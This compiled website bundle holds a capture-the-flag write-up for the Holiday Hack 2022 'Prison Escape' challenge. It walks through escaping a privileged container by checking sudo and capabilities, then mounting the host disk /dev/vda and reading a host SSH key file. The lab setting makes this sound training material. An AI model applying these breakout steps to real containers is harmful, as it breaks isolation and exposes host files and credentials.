"use strict";(self.webpackChunkhhc_2022=self.webpackChunkhhc_2022||[]).push([[722],{3905:(e,n,t)=>{t.d(n,{Zo:()=>p,kt:()=>f});var r=t(7294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var s=r.createContext({}),c=function(e){var n=r.useContext(s),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},p=function(e){var n=c(e.components);return r.createElement(s.Provider,{value:n},e.children)},h="mdxType",u={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},d=r.forwardRef((function(e,n){var t=e.components,o=e.mdxType,a=e.originalType,s=e.parentName,p=l(e,["components","mdxType","originalType","parentName"]),h=c(t),d=o,f=h["".concat(s,".").concat(d)]||h[d]||u[d]||a;return t?r.createElement(f,i(i({ref:n},p),{},{components:t})):r.createElement(f,i({ref:n},p))}));function f(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var a=t.length,i=new Array(a);i[0]=d;var l={};for(var s in n)hasOwnProperty.call(n,s)&&(l[s]=n[s]);l.originalType=e,l[h]="string"==typeof e?e:o,i[1]=l;for(var c=2;c<a;c++)i[c]=t[c];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}d.displayName="MDXCreateElement"},4e3:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>s,contentTitle:()=>i,default:()=>h,frontMatter:()=>a,metadata:()=>l,toc:()=>c});var r=t(7462),o=(t(7294),t(3905));const a={sidebar_position:2},i="Prison Escape",l={unversionedId:"hhc2022/elfen_ring/prison_escape",id:"hhc2022/elfen_ring/prison_escape",title:"Prison Escape",description:"Background",source:"@site/docs/hhc2022/elfen_ring/prison_escape.md",sourceDirName:"hhc2022/elfen_ring",slug:"/hhc2022/elfen_ring/prison_escape",permalink:"/hhc2022/docs/hhc2022/elfen_ring/prison_escape",draft:!1,tags:[],version:"current",sidebarPosition:2,frontMatter:{sidebar_position:2},sidebar:"tutorialSidebar",previous:{title:"Clone with a Difference",permalink:"/hhc2022/docs/hhc2022/elfen_ring/clone_with_a_difference"},next:{title:"Jolly CI/CD",permalink:"/hhc2022/docs/hhc2022/elfen_ring/jolly_cicd"}},s={},c=[{value:"Background",id:"background",level:3},{value:"Challenge",id:"challenge",level:3},{value:"Answer",id:"answer",level:3}],p={toc:c};function h(e){let{components:n,...a}=e;return(0,o.kt)("wrapper",(0,r.Z)({},p,a,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"prison-escape"},"Prison Escape"),(0,o.kt)("h3",{id:"background"},"Background"),(0,o.kt)("p",null,"This task asks us to escape a running container and find a file on the host operating system."),(0,o.kt)("h3",{id:"challenge"},"Challenge"),(0,o.kt)("admonition",{title:"Challenge Text",type:"info"},(0,o.kt)("p",{parentName:"admonition"},(0,o.kt)("em",{parentName:"p"},"Difficulty:")," \u2605\u2605\u2605\u2730\u2730"),(0,o.kt)("p",{parentName:"admonition"},"Escape from a container. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. What hex string appears in the host file /home/jailer/.ssh/jail.key.priv?")),(0,o.kt)("h3",{id:"answer"},"Answer"),(0,o.kt)("p",null,"Once we're inside our container prison, we start out by checking what we're allowed to do as root:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"grinchum-land:/mnt$ sudo -l\nUser samways may run the following commands on grinchum-land:\n    (ALL) NOPASSWD: ALL\n")),(0,o.kt)("p",null,"Great! We have carte blanche to sudo whatever we'd like as root. Next, we'll check our list of Unix capabilities. Normally in a container these should be as restrictive as possible, but let's hope someone was lazy here:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"grinchum-land:/mnt$ grep Cap /proc/1/status\nCapInh: 0000000000000000\nCapPrm: 0000003fffffffff\nCapEff: 0000003fffffffff\nCapBnd: 0000003fffffffff\nCapAmb: 0000000000000000\n")),(0,o.kt)("p",null,"To decode this gibberish, we can use the ",(0,o.kt)("inlineCode",{parentName:"p"},"capsh")," utility (on another host that has it)"),(0,o.kt)("p",null,(0,o.kt)("img",{alt:"Capsh decoded output, showing that we have cap_sys_admin",src:t(3702).Z,width:"1252",height:"332"})),(0,o.kt)("p",null,"Among the items in this list, the most useful to us by far is ",(0,o.kt)("inlineCode",{parentName:"p"},"cap_sys_admin"),". The ",(0,o.kt)("a",{parentName:"p",href:"https://man7.org/linux/man-pages/man7/capabilities.7.html"},"capabilities man page")," has more info, but this capability allows us to perform a very, very wide array of actions which would be useful for system administration. It just so happens that many of those are also capabilities that would help us break out of our current jail."),(0,o.kt)("hr",null),(0,o.kt)("p",null,"Going through a ",(0,o.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation"},"helpful list of container escape strategies"),", we don't have to look long before we notice that a disk device is, for some reason, listed under ",(0,o.kt)("inlineCode",{parentName:"p"},"/dev/"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"grinchum-land:/mnt$ ls -l /dev/\ntotal 0\ncrw-r--r-- 1 root root  10, 235 Jan  7 00:59 autofs\ncrw------- 1 root root  10, 234 Jan  7 00:59 btrfs-control\nlrwxrwxrwx 1 root root       11 Jan  7 00:59 core -> /proc/kcore\n...\ncrw-rw---- 1 root tty    7,  70 Jan  7 00:59 vcsu6\n# highlight-start\nbrw-rw---- 1 root disk 254,   0 Jan  7 00:59 vda\n# highlight-end\ncrw------- 1 root root  10,  63 Jan  7 00:59 vsock\ncrw-rw-rw- 1 root root   1,   5 Jan  7 00:59 zero\n")),(0,o.kt)("p",null,"Normally the disk device ",(0,o.kt)("inlineCode",{parentName:"p"},"/dev/vda")," wouldn't be mounted inside of the container. However, we all know that developers will complain to senior management if they have to do an ounce of additional work, so here we are. Since we verified earlier that we have the ",(0,o.kt)("inlineCode",{parentName:"p"},"CAP_SYS_ADMIN")," capability (which helpfully lets us mount and unmount things), we can now easily mount this device and find the flag:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"grinchum-land:~$ sudo mount /dev/vda /mnt/\ngrinchum-land:~$ ls -l /mnt/\n.dockerenv  etc/        lib64/      mnt/        run/        tmp/        \nbin/        home/       libx32/     opt/        sbin/       usr/        \nboot/       lib/        lost+found/ proc/       srv/        var/        \ndev/        lib32/      media/      root/       sys/        \ngrinchum-land:~$ ls -la /mnt/home/jailer/\ntotal 12\ndrwxr-xr-x 3 root root 4096 Dec  1 19:12 .\ndrwxr-xr-x 3 root root 4096 Dec  1 19:12 ..\ndrwxr-xr-x 2 root root 4096 Dec  1 19:12 .ssh\ngrinchum-land:~$ ls -la /mnt/home/jailer/.\n./    ../   .ssh/ \ngrinchum-land:~$ ls -la /mnt/home/jailer/.ssh/\ntotal 12\ndrwxr-xr-x 2 root root 4096 Dec  1 19:12 .\ndrwxr-xr-x 3 root root 4096 Dec  1 19:12 ..\n-rw-rw-rw- 1 root root 1555 Nov  3 23:36 jail.key.priv\n-rw-rw-rw- 1 root root    0 Nov  7 18:54 jail.key.pub\ngrinchum-land:~$ cat /mnt/home/jailer/.ssh/jail.key.priv \n\n                Congratulations! \n\n          You've found the secret for the \n          HHC22 container escape challenge!\n\n                     .--._..--.\n              ___   ( _'-_  -_.'\n          _.-'   `-._|  - :- |\n      _.-'           `--...__|\n   .-'                       '--..___\n  / `._                              \\\n   `. `._               one           |\n     `. `._                           /\n       '. `._    :__________....-----'\n         `..`---'    |-_  _- |___...----..._\n                     |_....--'             `.`.\n               _...--'                       `.`.\n          _..-'                             _.'.'\n       .-'             step                _.'.'\n       |                               _.'.'\n       |                   __....------'-'\n       |     __...------''' _|\n       '--'''        |-  - _ |\n               _.-''''''''''''''''''-._\n            _.'                        |\\\n          .'                         _.' |\n          `._          closer           |:.'\n            `._                     _.' |\n               `..__                 |  |\n                    `---.._.--.    _|  |\n                     | _   - | `-.._|_.'\n          .--...__   |   -  _|\n         .'_      `--.....__ |\n        .'_                 `--..__\n       .'_                         `.\n      .'_    082bb339ec19de4935867   `-.\n      `--..____                        _`.\n               ```--...____          _..--'\n                     | - _ ```---.._.'\n                     |   - _ |\n                     |_ -  - |\n                     |   - _ |\n                     | -_  -_|\n                     |   - _ |\n                     |   - _ |\n                     | -_  -_|\ngrinchum-land:~$ \n")))}h.isMDXComponent=!0},3702:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/er2-1-dbcc58c86e740e1a6e33d4610caf4b83.png"}}]);